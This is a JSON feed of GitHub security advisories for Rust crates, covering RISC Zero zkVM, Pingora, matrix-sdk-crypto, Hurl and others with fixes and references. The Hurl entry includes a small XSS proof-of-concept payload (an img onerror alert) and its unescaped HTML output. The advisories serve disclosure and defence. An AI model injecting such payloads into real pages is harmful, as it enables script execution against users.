{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Rust crates",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arust",
    "feed_url": "https://xlordz.github.io/github-advisory-database-rss/rust.json",
    "description": "Security Advisory for Rust crates on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Prior to 2.1.1 and 2.2.0, the <code>Steel.validateCommitment</code> Solidity library function will return <code>true</code> for a crafted commitment with a digest value of zero.</p>\n<p>This violates the semantics of <code>validateCommitment</code>, as this does not commitment to a block that is in the current chain. Because the digest is zero, it does not correspond to any block and there exist no known openings. As a result, this commitment will never be produced by a correct zkVM guest using Steel. Leveraging this bug to compromise the soundness of an application using Steel would require a separate bug or misuse of the Steel library, which is expected to be used to validate the root of state opening proofs (e.g. having the guest commit to a digest of zero, or failing to check the zkVM proof).</p>\n<p>Because this bug does not risk application integrity, correctly written applications are not at risk.</p>\n<h3 id=\"fix\">Fix</h3>\n<p>Please see <a href=\"https://github.com/risc0/risc0-ethereum/pull/605\">#605</a> for a full description of the bug, and the fix. This fix has been released as part of <code>risc0-ethereum</code> <a href=\"https://github.com/risc0/risc0-ethereum/releases/tag/v2.1.1\">2.1.1</a> and <a href=\"https://github.com/risc0/risc0-ethereum/releases/tag/v2.2.0\">2.2.0</a>.</p>\n<h3 id=\"recommended-actions\">Recommended actions</h3>\n<p>Users for the <code>Steel</code> Solidity library versions 2.1.0 or earlier should ensure they are using <code>Steel.validateCommitment</code> in tandem with zkVM proof verification of a Steel program, as shown in the <a href=\"https://github.com/risc0/risc0-ethereum/blob/ff0cb9253a87945b653b825711b8b5075f8b7545/examples/erc20-counter/contracts/src/Counter.sol#L56-L63\">ERC-20 counter example</a>, and <a href=\"https://docs.beboundless.xyz/developers/steel/how-it-works#verifying-the-proof-onchain\">documentation</a>. This is the correct usage of Steel, and users following this pattern are not at risk, and do not need to take action.</p>\n<p>Users not verifying a zkVM proof of a Steel program should update their application to do so, as this is incorrect usage of Steel.</p>\n<h3 id=\"credit\">Credit</h3>\n<p>A thank you to Daniel526 on HackenProof for reporting this issue</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/risc0/risc0-ethereum/security/advisories/GHSA-gjv3-89hh-9xq2\">https://github.com/risc0/risc0-ethereum/security/advisories/GHSA-gjv3-89hh-9xq2</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-52884\">https://nvd.nist.gov/vuln/detail/CVE-2025-52884</a></li>\n<li><a href=\"https://github.com/risc0/risc0-ethereum/pull/605\">https://github.com/risc0/risc0-ethereum/pull/605</a></li>\n<li><a href=\"https://github.com/risc0/risc0-ethereum/commit/3bbac859c7132b21ba5fdf2d47f1dd52e7e73d98\">https://github.com/risc0/risc0-ethereum/commit/3bbac859c7132b21ba5fdf2d47f1dd52e7e73d98</a></li>\n<li><a href=\"https://docs.beboundless.xyz/developers/steel/how-it-works#verifying-the-proof-onchain\">https://docs.beboundless.xyz/developers/steel/how-it-works#verifying-the-proof-onchain</a></li>\n<li><a href=\"https://github.com/risc0/risc0-ethereum/blob/ff0cb9253a87945b653b825711b8b5075f8b7545/examples/erc20-counter/contracts/src/Counter.sol#L56-L63\">https://github.com/risc0/risc0-ethereum/blob/ff0cb9253a87945b653b825711b8b5075f8b7545/examples/erc20-counter/contracts/src/Counter.sol#L56-L63</a></li>\n<li><a href=\"https://github.com/risc0/risc0-ethereum/releases/tag/v2.1.1\">https://github.com/risc0/risc0-ethereum/releases/tag/v2.1.1</a></li>\n<li><a href=\"https://github.com/risc0/risc0-ethereum/releases/tag/v2.2.0\">https://github.com/risc0/risc0-ethereum/releases/tag/v2.2.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-gjv3-89hh-9xq2\">https://github.com/advisories/GHSA-gjv3-89hh-9xq2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-gjv3-89hh-9xq2",
            "title": "[risc0-ethereum-contracts] RISC Zero Ethereum invalid commitment with digest value of zero accepted by Steel.validateCommitment",
            "date_modified": "2025-06-25T21:28:00.000Z",
            "date_published": "2025-06-25T21:27:59.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-gjv3-89hh-9xq2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The connection limiter is implemented incorrectly.\nIt allows an arbitrary amount of simultaneously incoming connections (TCP, UDP and Unix socket) for the services <code>letmeind</code> and <code>letmeinfwd</code>.\nTherefore, the command line option <code>num-connections</code> is not effective and does not limit the number of simultaneously incoming connections.</p>\n<p><code>letmeind</code> is the public network facing daemon (TCP/UDP).</p>\n<p><code>letmeinfwd</code> is the internal firewall daemon that only listens on local Unix socket.</p>\n<p>Possible Denial Of Service by resource exhaustion.</p>\n<h3 id=\"affected-versions\">Affected versions</h3>\n<p>All versions <code>&lt;= 10.2.0</code> are affected.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>All users shall upgrade to version <code>10.2.1</code>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Untested possible workarounds:</p>\n<ul>\n<li>It might be possible to limit the number of active connections to the <code>letmeind</code> port (default 5800) via firewall.</li>\n<li>The resource consumption of the service might be restricted with a service manager such as systemd.</li>\n</ul>\n<h3 id=\"severity\">Severity:</h3>\n<p>If a (D)DoS is run against the service, <em>something</em> is going to be affected.\nThe connection limiter assures that the effect on the system itself is limited at the expense of the effect on the letmein services itself.\nSo even with the connection limiter active, a (D)DoS can lead to a less responsive or unresponsive letmein service.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mbuesch/letmein/security/advisories/GHSA-jpv7-p47h-f43j\">https://github.com/mbuesch/letmein/security/advisories/GHSA-jpv7-p47h-f43j</a></li>\n<li><a href=\"https://github.com/mbuesch/letmein/commit/43207cd77580410d97165d1e3c07361ba6f3558c\">https://github.com/mbuesch/letmein/commit/43207cd77580410d97165d1e3c07361ba6f3558c</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-52570\">https://nvd.nist.gov/vuln/detail/CVE-2025-52570</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jpv7-p47h-f43j\">https://github.com/advisories/GHSA-jpv7-p47h-f43j</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jpv7-p47h-f43j",
            "title": "[letmeinfwd] letmein connection limiter allows an arbitrary amount of simultaneous connections",
            "date_modified": "2025-06-27T23:08:47.000Z",
            "date_published": "2025-06-23T21:24:59.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jpv7-p47h-f43j"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The connection limiter is implemented incorrectly.\nIt allows an arbitrary amount of simultaneously incoming connections (TCP, UDP and Unix socket) for the services <code>letmeind</code> and <code>letmeinfwd</code>.\nTherefore, the command line option <code>num-connections</code> is not effective and does not limit the number of simultaneously incoming connections.</p>\n<p><code>letmeind</code> is the public network facing daemon (TCP/UDP).</p>\n<p><code>letmeinfwd</code> is the internal firewall daemon that only listens on local Unix socket.</p>\n<p>Possible Denial Of Service by resource exhaustion.</p>\n<h3 id=\"affected-versions\">Affected versions</h3>\n<p>All versions <code>&lt;= 10.2.0</code> are affected.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>All users shall upgrade to version <code>10.2.1</code>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Untested possible workarounds:</p>\n<ul>\n<li>It might be possible to limit the number of active connections to the <code>letmeind</code> port (default 5800) via firewall.</li>\n<li>The resource consumption of the service might be restricted with a service manager such as systemd.</li>\n</ul>\n<h3 id=\"severity\">Severity:</h3>\n<p>If a (D)DoS is run against the service, <em>something</em> is going to be affected.\nThe connection limiter assures that the effect on the system itself is limited at the expense of the effect on the letmein services itself.\nSo even with the connection limiter active, a (D)DoS can lead to a less responsive or unresponsive letmein service.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mbuesch/letmein/security/advisories/GHSA-jpv7-p47h-f43j\">https://github.com/mbuesch/letmein/security/advisories/GHSA-jpv7-p47h-f43j</a></li>\n<li><a href=\"https://github.com/mbuesch/letmein/commit/43207cd77580410d97165d1e3c07361ba6f3558c\">https://github.com/mbuesch/letmein/commit/43207cd77580410d97165d1e3c07361ba6f3558c</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-52570\">https://nvd.nist.gov/vuln/detail/CVE-2025-52570</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jpv7-p47h-f43j\">https://github.com/advisories/GHSA-jpv7-p47h-f43j</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jpv7-p47h-f43j",
            "title": "[letmeind] letmein connection limiter allows an arbitrary amount of simultaneous connections",
            "date_modified": "2025-06-27T23:08:47.000Z",
            "date_published": "2025-06-23T21:24:59.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jpv7-p47h-f43j"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>In scan.rs in spytrap-adb before 0.3.5, matches for known stalkerware are not rendered in the interactive user interface.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-52926\">https://nvd.nist.gov/vuln/detail/CVE-2025-52926</a></li>\n<li><a href=\"https://github.com/spytrap-org/spytrap-adb/pull/65\">https://github.com/spytrap-org/spytrap-adb/pull/65</a></li>\n<li><a href=\"https://github.com/spytrap-org/spytrap-adb/commit/277cec542466b75cf5a8c532581243fd4b7b9713\">https://github.com/spytrap-org/spytrap-adb/commit/277cec542466b75cf5a8c532581243fd4b7b9713</a></li>\n<li><a href=\"https://github.com/spytrap-org/spytrap-adb/releases/tag/v0.3.5\">https://github.com/spytrap-org/spytrap-adb/releases/tag/v0.3.5</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5p2p-6g2c-hf7m\">https://github.com/advisories/GHSA-5p2p-6g2c-hf7m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5p2p-6g2c-hf7m",
            "title": "[spytrap-adb] spytrap-adb Omission of Security-relevant Information",
            "date_modified": "2025-06-23T21:24:23.000Z",
            "date_published": "2025-06-23T03:30:30.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5p2p-6g2c-hf7m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Due to a missing constraint in the rv32im circuit, any 3-register RISC-V instruction (including remu and divu) in risc0-zkvm 2.0.0, 2.0.1, and 2.0.2 are vulnerable to an attack by a malicious prover. The main idea for the attack is to confuse the RISC-V virtual machine into treating the value of the rs1 register as the same as the rs2 register due to a lack of constraints in the rv32im circuit.</p>\n<p>This vulnerability was reported by Christoph Hochrainer via our Hackenproof bug bounty. We have evaluated the severity of the vulnerability as “Critical,” and paid a bounty. </p>\n<p>The fix for the circuit was implemented in <a href=\"https://github.com/risc0/zirgen/pull/238\">zirgen/pull/238</a>, and the update to risc0 was implemented in <a href=\"https://github.com/risc0/risc0/pull/3181\">risc0/pull/3181</a>. Impacted on-chain verifiers have already been disabled via the estop mechanism outlined in the <a href=\"https://github.com/risc0/risc0-ethereum/blob/release-2.0/contracts/version-management-design.md#base-verifier-implementations\">Verifier Management Design</a>. </p>\n<h2 id=\"mitigation\">Mitigation</h2>\n<p>We recommend all impacted users upgrade as soon as possible.</p>\n<p>Rust applications using the risc0-zkvm crate at versions 2.0.0, 2.0.1, and 2.0.2 should upgrade to version 2.1.0.</p>\n<p>Smart contract applications using the official <a href=\"https://dev.risczero.com/api/blockchain-integration/contracts/verifier#verifier-router\">RISC Zero Verifier Router</a> do not need to take any action: zkVM version 2.1 is active on all official routers, and version 2.0 has been disabled.</p>\n<p>Smart contract applications not using the verifier router should update their contracts to send verification calls to the 2.1 version of the verifier.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/risc0/risc0/security/advisories/GHSA-g3qg-6746-3mg9\">https://github.com/risc0/risc0/security/advisories/GHSA-g3qg-6746-3mg9</a></li>\n<li><a href=\"https://github.com/risc0/risc0/pull/3181\">https://github.com/risc0/risc0/pull/3181</a></li>\n<li><a href=\"https://github.com/risc0/zirgen/pull/238\">https://github.com/risc0/zirgen/pull/238</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-52484\">https://nvd.nist.gov/vuln/detail/CVE-2025-52484</a></li>\n<li><a href=\"https://github.com/risc0/risc0/commit/006d86c363b16d2b2ac42d32d832a209ff8ab4c9\">https://github.com/risc0/risc0/commit/006d86c363b16d2b2ac42d32d832a209ff8ab4c9</a></li>\n<li><a href=\"https://github.com/risc0/risc0/commit/1873bbb8a56793edd1f6195242d184cf6cc5175d\">https://github.com/risc0/risc0/commit/1873bbb8a56793edd1f6195242d184cf6cc5175d</a></li>\n<li><a href=\"https://github.com/risc0/risc0/commit/67f2d81c638bff5f4fcfe11a084ebb34799b7a89\">https://github.com/risc0/risc0/commit/67f2d81c638bff5f4fcfe11a084ebb34799b7a89</a></li>\n<li><a href=\"https://github.com/risc0/zirgen/commit/e0e2918302c93e956f73ca2e44aef2b861d8c3ae\">https://github.com/risc0/zirgen/commit/e0e2918302c93e956f73ca2e44aef2b861d8c3ae</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g3qg-6746-3mg9\">https://github.com/advisories/GHSA-g3qg-6746-3mg9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g3qg-6746-3mg9",
            "title": "[risc0-circuit-rv32im] zkVM Underconstrained Vulnerability",
            "date_modified": "2025-06-27T23:59:03.000Z",
            "date_published": "2025-06-20T18:08:04.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g3qg-6746-3mg9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Due to a missing constraint in the rv32im circuit, any 3-register RISC-V instruction (including remu and divu) in risc0-zkvm 2.0.0, 2.0.1, and 2.0.2 are vulnerable to an attack by a malicious prover. The main idea for the attack is to confuse the RISC-V virtual machine into treating the value of the rs1 register as the same as the rs2 register due to a lack of constraints in the rv32im circuit.</p>\n<p>This vulnerability was reported by Christoph Hochrainer via our Hackenproof bug bounty. We have evaluated the severity of the vulnerability as “Critical,” and paid a bounty. </p>\n<p>The fix for the circuit was implemented in <a href=\"https://github.com/risc0/zirgen/pull/238\">zirgen/pull/238</a>, and the update to risc0 was implemented in <a href=\"https://github.com/risc0/risc0/pull/3181\">risc0/pull/3181</a>. Impacted on-chain verifiers have already been disabled via the estop mechanism outlined in the <a href=\"https://github.com/risc0/risc0-ethereum/blob/release-2.0/contracts/version-management-design.md#base-verifier-implementations\">Verifier Management Design</a>. </p>\n<h2 id=\"mitigation\">Mitigation</h2>\n<p>We recommend all impacted users upgrade as soon as possible.</p>\n<p>Rust applications using the risc0-zkvm crate at versions 2.0.0, 2.0.1, and 2.0.2 should upgrade to version 2.1.0.</p>\n<p>Smart contract applications using the official <a href=\"https://dev.risczero.com/api/blockchain-integration/contracts/verifier#verifier-router\">RISC Zero Verifier Router</a> do not need to take any action: zkVM version 2.1 is active on all official routers, and version 2.0 has been disabled.</p>\n<p>Smart contract applications not using the verifier router should update their contracts to send verification calls to the 2.1 version of the verifier.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/risc0/risc0/security/advisories/GHSA-g3qg-6746-3mg9\">https://github.com/risc0/risc0/security/advisories/GHSA-g3qg-6746-3mg9</a></li>\n<li><a href=\"https://github.com/risc0/risc0/pull/3181\">https://github.com/risc0/risc0/pull/3181</a></li>\n<li><a href=\"https://github.com/risc0/zirgen/pull/238\">https://github.com/risc0/zirgen/pull/238</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-52484\">https://nvd.nist.gov/vuln/detail/CVE-2025-52484</a></li>\n<li><a href=\"https://github.com/risc0/risc0/commit/006d86c363b16d2b2ac42d32d832a209ff8ab4c9\">https://github.com/risc0/risc0/commit/006d86c363b16d2b2ac42d32d832a209ff8ab4c9</a></li>\n<li><a href=\"https://github.com/risc0/risc0/commit/1873bbb8a56793edd1f6195242d184cf6cc5175d\">https://github.com/risc0/risc0/commit/1873bbb8a56793edd1f6195242d184cf6cc5175d</a></li>\n<li><a href=\"https://github.com/risc0/risc0/commit/67f2d81c638bff5f4fcfe11a084ebb34799b7a89\">https://github.com/risc0/risc0/commit/67f2d81c638bff5f4fcfe11a084ebb34799b7a89</a></li>\n<li><a href=\"https://github.com/risc0/zirgen/commit/e0e2918302c93e956f73ca2e44aef2b861d8c3ae\">https://github.com/risc0/zirgen/commit/e0e2918302c93e956f73ca2e44aef2b861d8c3ae</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g3qg-6746-3mg9\">https://github.com/advisories/GHSA-g3qg-6746-3mg9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g3qg-6746-3mg9",
            "title": "[risc0-zkvm] zkVM Underconstrained Vulnerability",
            "date_modified": "2025-06-27T23:59:03.000Z",
            "date_published": "2025-06-20T18:08:04.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g3qg-6746-3mg9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A request smuggling vulnerability identified within Pingora’s proxying framework, pingora-proxy, allows malicious HTTP requests to be injected via manipulated request bodies on cache HITs, leading to unauthorized request execution and potential cache poisoning.</p>\n<h3 id=\"fixed-in\">Fixed in</h3>\n<p><a href=\"https://github.com/cloudflare/pingora/commit/fda3317ec822678564d641e7cf1c9b77ee3759ff\">https://github.com/cloudflare/pingora/commit/fda3317ec822678564d641e7cf1c9b77ee3759ff</a> </p>\n<h3 id=\"impact\">Impact</h3>\n<p>The issue could lead to request smuggling in cases where Pingora’s proxying framework, pingora-proxy, is used for caching allowing an attacker to manipulate headers and URLs in subsequent requests made on the same HTTP/1.1 connection.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cloudflare/pingora/security/advisories/GHSA-93c7-7xqw-w357\">https://github.com/cloudflare/pingora/security/advisories/GHSA-93c7-7xqw-w357</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-4366\">https://nvd.nist.gov/vuln/detail/CVE-2025-4366</a></li>\n<li><a href=\"https://github.com/cloudflare/pingora/commit/fda3317ec822678564d641e7cf1c9b77ee3759ff\">https://github.com/cloudflare/pingora/commit/fda3317ec822678564d641e7cf1c9b77ee3759ff</a></li>\n<li><a href=\"https://blog.cloudflare.com/resolving-a-request-smuggling-vulnerability-in-pingora\">https://blog.cloudflare.com/resolving-a-request-smuggling-vulnerability-in-pingora</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2025-0037.html\">https://rustsec.org/advisories/RUSTSEC-2025-0037.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-93c7-7xqw-w357\">https://github.com/advisories/GHSA-93c7-7xqw-w357</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-93c7-7xqw-w357",
            "title": "[pingora-core] Pingora has a Request Smuggling Vulnerability",
            "date_modified": "2025-06-20T18:07:49.000Z",
            "date_published": "2025-06-20T18:07:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-93c7-7xqw-w357"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The unsound function <code>dump_code_load_record</code> uses <code>from_raw_parts</code> to directly convert the pointer <code>addr</code> and <code>len</code> into a slice without any validation and that memory block would be dumped.</p>\n<p>Thus, the 'safe' function dump_code_load_record is actually 'unsafe' since it requires the caller to guarantee that the addr is valid and len must not overflow. Otherwise, the function could dump the memory into file illegally, causing memory leak.</p>\n<blockquote>\n<p><strong>Note</strong>: this is an internal-only crate in the Wasmtime project not intended for external use and is more strongly signaled nowadays as of <a href=\"https://github.com/bytecodealliance/wasmtime/pull/10963\">bytecodealliance/wasmtime#10963</a>. Please open an issue in Wasmtime if you're using this crate directly.</p>\n</blockquote>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/bytecodealliance/wasmtime/issues/8905\">https://github.com/bytecodealliance/wasmtime/issues/8905</a></li>\n<li><a href=\"https://github.com/bytecodealliance/wasmtime/commit/b5e31a5c33725ab8a7dfbe8505c56b5cf282ffed\">https://github.com/bytecodealliance/wasmtime/commit/b5e31a5c33725ab8a7dfbe8505c56b5cf282ffed</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2024-0442.html\">https://rustsec.org/advisories/RUSTSEC-2024-0442.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9ghp-w2hm-vfpf\">https://github.com/advisories/GHSA-9ghp-w2hm-vfpf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9ghp-w2hm-vfpf",
            "title": "[wasmtime-jit-debug] wasmtime_jit_debug Dumps Undefined Memory by `JitDumpFile`",
            "date_modified": "2025-06-17T15:37:57.000Z",
            "date_published": "2025-06-17T15:37:56.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9ghp-w2hm-vfpf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Given this Hurl file:</p>\n<p>regex.hurl:</p>\n<pre><code>GET https://foo.com\nHTTP 200\n[Asserts]\njsonpath \"$.body\" matches /&lt;img src=\"\" onerror=\"alert('Hi!')\"&gt;/\n</code></pre>\n<p>When exported to HTML:</p>\n<pre><code>$ hurlfmt --out html regex.hurl\n&lt;pre&gt;&lt;code class=\"language-hurl\"&gt;&lt;span class=\"hurl-entry\"&gt;&lt;span class=\"request\"&gt;&lt;span class=\"line\"&gt;&lt;span class=\"method\"&gt;GET&lt;/span&gt; &lt;span class=\"url\"&gt;https://foo.com&lt;/span&gt;&lt;/span&gt;\n&lt;/span&gt;&lt;span class=\"response\"&gt;&lt;span class=\"line\"&gt;&lt;span class=\"version\"&gt;HTTP&lt;/span&gt; &lt;span class=\"number\"&gt;200&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"line\"&gt;&lt;span class=\"section-header\"&gt;[Asserts]&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"line\"&gt;&lt;span class=\"query-type\"&gt;jsonpath&lt;/span&gt; &lt;span class=\"string\"&gt;\"$.body\"&lt;/span&gt; &lt;span class=\"predicate-type\"&gt;matches&lt;/span&gt; &lt;span class=\"regex\"&gt;/&lt;img src=\"\" onerror=\"alert('Hi!')\"&gt;/&lt;/span&gt;&lt;/span&gt;\n&lt;/span&gt;&lt;/span&gt;&lt;span class=\"line\"&gt;&lt;/span&gt;\n&lt;/code&gt;&lt;/pre&gt;\n</code></pre>\n<p>The regex literal <code>/&lt;img src=\"\" onerror=\"alert('Hi!')\"&gt;/</code> is not escaped:</p>\n<p><code>&lt;span class=\"regex\"&gt;/&lt;img src=\"\" onerror=\"alert('Hi!')\"&gt;/&lt;/span&gt;&lt;/span&gt;</code></p>\n<p>When opened in a browser, the code is run without user interaction:</p>\n<p><img alt=\"regex\" src=\"https://github.com/user-attachments/assets/9c20a2ff-900f-4420-b38b-1e7648749119\"></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/Orange-OpenSource/hurl/security/advisories/GHSA-v33j-v3x4-42qg\">https://github.com/Orange-OpenSource/hurl/security/advisories/GHSA-v33j-v3x4-42qg</a></li>\n<li><a href=\"https://github.com/Orange-OpenSource/hurl/commit/248ac41cfa1797c52241c6ef756490d90027cdf2\">https://github.com/Orange-OpenSource/hurl/commit/248ac41cfa1797c52241c6ef756490d90027cdf2</a></li>\n<li><a href=\"https://github.com/Orange-OpenSource/hurl/commit/7dcdbd1796785392b1e829d1f07c6687b9a8f27d\">https://github.com/Orange-OpenSource/hurl/commit/7dcdbd1796785392b1e829d1f07c6687b9a8f27d</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v33j-v3x4-42qg\">https://github.com/advisories/GHSA-v33j-v3x4-42qg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v33j-v3x4-42qg",
            "title": "[hurl] Regex literal in Hurl files are not escaped when exported to HTML, allowing injections",
            "date_modified": "2025-06-11T14:46:39.000Z",
            "date_published": "2025-06-11T14:46:37.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v33j-v3x4-42qg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>matrix-sdk-crypto since version 0.8.0 up to 0.11.0 does not correctly validate the sender of an encrypted event. Accordingly, a malicious homeserver operator can modify events served to clients, making those events appear to the recipient as if they were sent by another user.</p>\n<p>Although the CVSS score is 4.9 (AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:N), we consider this a High Severity security issue.</p>\n<h3 id=\"details\">Details</h3>\n<p>The Matrix specification <a href=\"https://spec.matrix.org/v1.14/client-server-api/#mmegolmv1aes-sha2\">requires</a> that clients ensure that \"the event’s <code>sender</code>, <code>room_id</code>, and the recorded <code>session_id</code> match a trusted session\". The vulnerable matrix-sdk-crypto versions check that the <code>room_id</code> matches that of the session denoted by <code>session_id</code>, but do not check the <code>sender</code>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The issue is resolved by <a href=\"https://github.com/matrix-org/matrix-rust-sdk/commit/13c1d2048286bbabf5e7bc6b015aafee98f04d55\">13c1d20</a>, included in versions 0.11.1 and 0.12.0 of matrix-sdk-crypto.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Since a successful attack requires administrator access to the homeserver, users who trust the administrators of their local homeserver are not affected.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://spec.matrix.org/v1.14/client-server-api/#mmegolmv1aes-sha2\">https://spec.matrix.org/v1.14/client-server-api/#mmegolmv1aes-sha2</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/matrix-org/matrix-rust-sdk/security/advisories/GHSA-x958-rvg6-956w\">https://github.com/matrix-org/matrix-rust-sdk/security/advisories/GHSA-x958-rvg6-956w</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-48937\">https://nvd.nist.gov/vuln/detail/CVE-2025-48937</a></li>\n<li><a href=\"https://github.com/matrix-org/matrix-rust-sdk/commit/13c1d2048286bbabf5e7bc6b015aafee98f04d55\">https://github.com/matrix-org/matrix-rust-sdk/commit/13c1d2048286bbabf5e7bc6b015aafee98f04d55</a></li>\n<li><a href=\"https://github.com/matrix-org/matrix-rust-sdk/commit/56980745b4f27f7dc72ac296e6aa003e5d92a75b\">https://github.com/matrix-org/matrix-rust-sdk/commit/56980745b4f27f7dc72ac296e6aa003e5d92a75b</a></li>\n<li><a href=\"https://spec.matrix.org/v1.14/client-server-api/#mmegolmv1aes-sha2\">https://spec.matrix.org/v1.14/client-server-api/#mmegolmv1aes-sha2</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2025-0041.html\">https://rustsec.org/advisories/RUSTSEC-2025-0041.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x958-rvg6-956w\">https://github.com/advisories/GHSA-x958-rvg6-956w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x958-rvg6-956w",
            "title": "[matrix-sdk-crypto] matrix-sdk-crypto vulnerable to sender of encrypted events being spoofed by homeserver administrator",
            "date_modified": "2025-06-12T21:23:39.000Z",
            "date_published": "2025-06-10T20:15:37.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x958-rvg6-956w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"duplicate-advisory\">Duplicate Advisory</h3>\n<p>This advisory has been withdrawn because it is a duplicate of GHSA-m65q-v92h-cm7q. This link is maintained to preserve external references.</p>\n<h3 id=\"original-description\">Original Description</h3>\n<p>A flaw was found in the user's crate for Rust. This vulnerability allows privilege escalation via incorrect group listing when a user or process has fewer than exactly 1024 groups, leading to the erroneous inclusion of the root group in the access list.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-5791\">https://nvd.nist.gov/vuln/detail/CVE-2025-5791</a></li>\n<li><a href=\"https://github.com/ogham/rust-users/issues/44\">https://github.com/ogham/rust-users/issues/44</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2025-5791\">https://access.redhat.com/security/cve/CVE-2025-5791</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2370001\">https://bugzilla.redhat.com/show_bug.cgi?id=2370001</a></li>\n<li><a href=\"https://crates.io/crates/users\">https://crates.io/crates/users</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2025-0040.html\">https://rustsec.org/advisories/RUSTSEC-2025-0040.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jq8x-v7jw-v675\">https://github.com/advisories/GHSA-jq8x-v7jw-v675</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jq8x-v7jw-v675",
            "title": "[users] Duplicate Advisory: users may append `root` to group listings",
            "date_modified": "2025-06-06T23:16:21.000Z",
            "date_published": "2025-06-06T15:30:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jq8x-v7jw-v675"
            },
            "tags": [
                "severity"
            ]
        },
        {
